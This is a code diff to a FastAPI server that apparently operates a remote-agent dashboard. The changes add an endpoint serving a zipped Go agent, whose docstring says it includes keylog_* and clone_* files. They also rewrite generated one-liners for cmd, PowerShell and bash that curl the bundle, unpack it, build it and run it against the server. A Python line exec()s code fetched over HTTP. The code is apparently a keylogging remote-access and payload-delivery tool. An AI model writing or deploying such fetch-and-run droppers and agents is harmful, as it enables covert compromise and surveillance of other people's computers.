@@ -55,7 +55,7 @@ from fastapi import (
     WebSocket,
     WebSocketDisconnect,
 )
-from fastapi.responses import FileResponse, JSONResponse, RedirectResponse, PlainTextResponse, StreamingResponse
+from fastapi.responses import FileResponse, Response, JSONResponse, RedirectResponse, PlainTextResponse, StreamingResponse
 from fastapi.staticfiles import StaticFiles
 from starlette.middleware.base import BaseHTTPMiddleware
 from fastapi.templating import Jinja2Templates
@@ -292,7 +292,9 @@ async def lifespan(app: FastAPI):
     created, effective = auth.sync_default_user(username, password)
     if created:
         print("[!] dashboard user ready")
-        print(f"    url:      http://<server>:8000/login")
+        _host = os.environ.get("WYM_HOST", "127.0.0.1")
+        _port = os.environ.get("WYM_PORT", "8000" if sys.platform == "win32" else "8001")
+        print(f"    url:      http://{_host}:{_port}/login")
         print(f"    username: {username}")
         print(f"    password: {effective}")
 
@@ -1217,6 +1219,7 @@ def _build_agent_command(language: str, server: str, token: str,
     flags = f" --server {server} --interval {interval}{j}{v}"
     dl_build = f"{server}/download/build/{language}?target={target}&token={token}"
     dl_src = f"{server}/download/agent/{language}?token={token}"
+    dl_go = f"{server}/download/agent/go/source?token={token}"
 
     def _compiled_cmd(build_dl, ext):
         if shell_os == "windows":
@@ -1274,7 +1277,9 @@ def _build_agent_command(language: str, server: str, token: str,
                     f" && python.exe \"{q}\\agent.py\"{flags}"
                 ),
                 "go": (
-                    f"{envset}go build -o \"{q}\\agent.exe\" {dl_src}"
+                    f"{envset}curl.exe -sL \"{dl_go}\" -o \"{q}\\wymgo_src.zip\" && "
+                    f"powershell -NoProfile -Command \"Expand-Archive -Path '{q}\\wymgo_src.zip' -DestinationPath '{q}\\wymgo_src' -Force\" && "
+                    f"cd /d \"{q}\\wymgo_src\" && go build -o \"{q}\\agent.exe\" ."
                     f" && \"{q}\\agent.exe\"{flags}"
                 ),
                 "csharp": (
@@ -1333,7 +1338,10 @@ def _build_agent_command(language: str, server: str, token: str,
             ),
             "go": (
                 f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
-                f"go build -o $env:TEMP\\agent.exe {dl_src}; & $env:TEMP\\agent.exe{flags}"
+                f"$z=\"$env:TEMP\\wymgo_src.zip\"; curl.exe -sL \"{dl_go}\" -o $z; "
+                f"$d=\"$env:TEMP\\wymgo_src\"; Expand-Archive -Path $z -DestinationPath $d -Force; "
+                f"Push-Location $d; & go build -o \"$env:TEMP\\agent.exe\" .; Pop-Location; "
+                f"& $env:TEMP\\agent.exe{flags}"
             ),
             "csharp": (
                 f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
@@ -1395,7 +1403,11 @@ def _build_agent_command(language: str, server: str, token: str,
             f"\"exec(__import__('urllib.request').urlopen('{dl_src}').read())\""
         ),
         "go": (
-            f"WYM_SERVER={server} WYM_TOKEN={token} go run {dl_src}{flags}"
+            f"WYM_SERVER={server} WYM_TOKEN={token} bash -c "
+            f"\"D=$(mktemp -d); curl -sL {dl_go} -o $D/s.zip; "
+            f"(unzip -oq $D/s.zip -d $D 2>/dev/null || "
+            f"python3 -c 'import zipfile,sys;zipfile.ZipFile(sys.argv[1]).extractall(sys.argv[2])' $D/s.zip $D); "
+            f"cd $D; go run .{flags}\""
         ),
         "csharp": (
             f"# .NET SDK required\n"
@@ -1614,13 +1626,8 @@ MOBILE_ICONS = tuple(icons.ICON_KINDS)
 
 @app.get("/download/agent/{language}", include_in_schema=False)
 async def download_agent_source(request: Request, language: str, token: str = ""):
-    user = get_current_user(request)
-    if not user:
-        hdr = request.headers.get("x-agent-token", "")
-        tok = token or hdr
-        expected = app.state.agent_token
-        if not expected or not tok or not secrets.compare_digest(tok, expected):
-            raise HTTPException(status_code=401, detail="authentication required")
+    if not _agent_download_allowed(request, token):
+        raise HTTPException(status_code=401, detail="authentication required")
     if language not in AGENT_FILES:
         raise HTTPException(status_code=404, detail="unknown language")
     filename, mimetype = AGENT_FILES[language]
@@ -1628,6 +1635,44 @@ async def download_agent_source(request: Request, language: str, token: str = ""
     if not path.is_file():
         raise HTTPException(status_code=404, detail="agent file not found")
     return FileResponse(path, media_type=mimetype, filename=filename)
+
+
+def _agent_download_allowed(request: Request, token: str) -> bool:
+    """Allow signed-in dashboard users or anyone holding the agent token."""
+    user = get_current_user(request)
+    if user:
+        return True
+    hdr = request.headers.get("x-agent-token", "")
+    tok = token or hdr
+    expected = app.state.agent_token
+    return bool(expected and tok and secrets.compare_digest(tok, expected))
+
+
+def _go_source_bundle() -> bytes:
+    """Zip of every Go source file + go.mod. `agent.go` is split across
+    clone_*/keylog_* files (build tags), so a single-file download cannot
+    compile on a target host — on-target `go build` installers use this."""
+    import io as _io
+    import zipfile as _zf
+
+    buf = _io.BytesIO()
+    with _zf.ZipFile(buf, "w", _zf.ZIP_DEFLATED) as z:
+        for f in sorted(CLIENTS_DIR.glob("*.go")):
+            z.writestr(f.name, f.read_bytes())
+        z.writestr("go.mod", "module wymagent\n\ngo 1.21\n")
+    return buf.getvalue()
+
+
+@app.get("/download/agent/go/source", include_in_schema=False)
+async def download_go_source_bundle(request: Request, token: str = ""):
+    if not _agent_download_allowed(request, token):
+        raise HTTPException(status_code=401, detail="authentication required")
+    buf = _go_source_bundle()
+    return Response(
+        content=buf,
+        media_type="application/zip",
+        headers={"Content-Disposition": 'attachment; filename="wymagent_go_src.zip"'},
+    )
 
 
 @app.get("/api/download/agent/{language}/oneliner")
@@ -1681,6 +1726,7 @@ def _build_installer(language: str, server: str, token: str, interval: int,
     if verbose:
         opt += " --verbose"
     dl = f"{server}/download/agent/{language}?token={token}"
+    dl_go = f"{server}/download/agent/go/source?token={token}"
     # optional custom extension is respected for the downloaded filename
     ext_q = f"&ext={urllib.parse.quote(ext)}" if ext.strip() else ""
     dl_build = f"{server}/download/build/{language}?target={target}&token={token}{ext_q}"
@@ -1738,7 +1784,13 @@ def _build_installer(language: str, server: str, token: str, interval: int,
                 # (avoids downloading the source twice).
                 fetch = ""
                 if language == "go":
-                    run = f"curl -fsSL {_shell_quote(dl)} -o \"$SRC\" && go build -o {out} \"$SRC\" && {out} --server {S} --token {T} {opt}"
+                    run = (
+                        'D="$(mktemp -d ${TMPDIR:-/tmp}/wymgo.XXXXXX)"; '
+                        f'curl -fsSL {_shell_quote(dl_go)} -o "$D/src.zip" && '
+                        '(unzip -oq "$D/src.zip" -d "$D" 2>/dev/null || '
+                        'python3 -c "import zipfile,sys;zipfile.ZipFile(sys.argv[1]).extractall(sys.argv[2])" "$D/src.zip" "$D") && '
+                        f'cd "$D" && go build -o {out} . && {out} --server {S} --token {T} {opt}'
+                    )
                 elif language == "rust":
                     # Needs cargo, not bare rustc: agent.rs pulls crates (reqwest,
                     # serde, rdev). Scaffold a temp crate and build it.
@@ -1839,12 +1891,21 @@ def _build_installer(language: str, server: str, token: str, interval: int,
                 fetch_src = dl_build_q
                 run = f"& $p --server '{S}' --token '{T}' {opt}"
             elif language == "go":
-                run = f"& go build -o '{out}' $p; & '{out}' --server '{S}' --token '{T}' {opt}"
+                p_assign = "\"$env:TEMP\\wymagent_go.src.zip\""
+                fetch_src = "'" + dl_go.replace("'", "''") + "'"
+                run = (
+                    "$d = \"$env:TEMP\\wymgo_src\"; "
+                    "Expand-Archive -Path $p -DestinationPath $d -Force; "
+                    "Push-Location $d; "
+                    f"& go build -o \"{out}\" .; "
+                    "Pop-Location; "
+                    f"& \"{out}\" --server '{S}' --token '{T}' {opt}"
+                )
             elif language in ("c", "cpp"):
                 cc = "g++" if language == "cpp" else "gcc"
-                run = f"& {cc} -O2 -o '{out}' $p -lcurl; & '{out}' --server '{S}' --token '{T}' {opt}"
+                run = f"& {cc} -O2 -o \"{out}\" $p -lcurl; & \"{out}\" --server '{S}' --token '{T}' {opt}"
             elif language == "rust":
-                run = f"& rustc -O -o '{out}' $p; & '{out}' --server '{S}' --token '{T}' {opt}"
+                run = f"& rustc -O -o \"{out}\" $p; & \"{out}\" --server '{S}' --token '{T}' {opt}"
             else:
                 run = f"# .NET SDK required; run: dotnet script $p -- --server '{S}' --token '{T}' {opt}"
         script = (
@@ -4093,7 +4154,7 @@ if __name__ == "__main__":
     uvicorn.run(
         "main:app",
         host=os.environ.get("WYM_HOST", "127.0.0.1"),
-        port=int(os.environ.get("WYM_PORT", "8000")),
+        port=int(os.environ.get("WYM_PORT", "8000" if sys.platform == "win32" else "8001")),
         log_level="info",
         log_config=_build_log_config(),
     )
